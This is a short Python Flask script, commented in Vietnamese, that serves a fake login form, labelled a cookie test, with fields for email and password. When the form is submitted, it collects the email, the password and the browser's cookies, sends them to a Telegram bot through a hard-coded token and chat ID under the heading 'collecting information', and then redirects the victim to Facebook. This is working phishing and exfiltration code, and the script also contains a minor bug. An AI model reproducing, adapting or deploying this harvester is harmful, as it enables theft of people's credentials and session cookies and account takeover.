from flask import Flask, request, redirect
import requests
from datetime import datetime

app = Flask(__name__)

TELEGRAM_TOKEN = "8600949928:AAERwWL0-6sODzfixw--L5rNHW4hRW56HnY"
TELEGRAM_CHAT_ID = "6126534090"

def send_telegram(title, content):
    try:
        message = f"🔴 {title}\n\n{content}\n⏰ {datetime.now()}"
        requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", 
                     data={"chat_id": TELEGRAM_CHAT_ID, "text": message})
        print("✅ Gửi Telegram thành công")
    except Exception as e:
        print("❌ Lỗi Telegram:", e)

@app.route('/')
def home():
    return """
    <h1>Test Cookie</h1>
    <form method="post" action="/login">
        <input type="text" name="email" placeholder="Email" value="test@gmail.com"><br><br>
        <input type="password" name="pass" placeholder="Password" value="123456"><br><br>
        <button type="submit">Đăng nhập Test</button>
    </form>
    """

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email')
    password = request.form.get('pass')
    cookies = request.cookies.to_dict()  # Lấy cookie từ request

    content = f"Email: {email}\nPassword: {password}\nCookies: {cookies}"
    send_telegram("THU THẬP THÔNG TIN", content)
    
    return redirect('https://www.facebook.com')

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)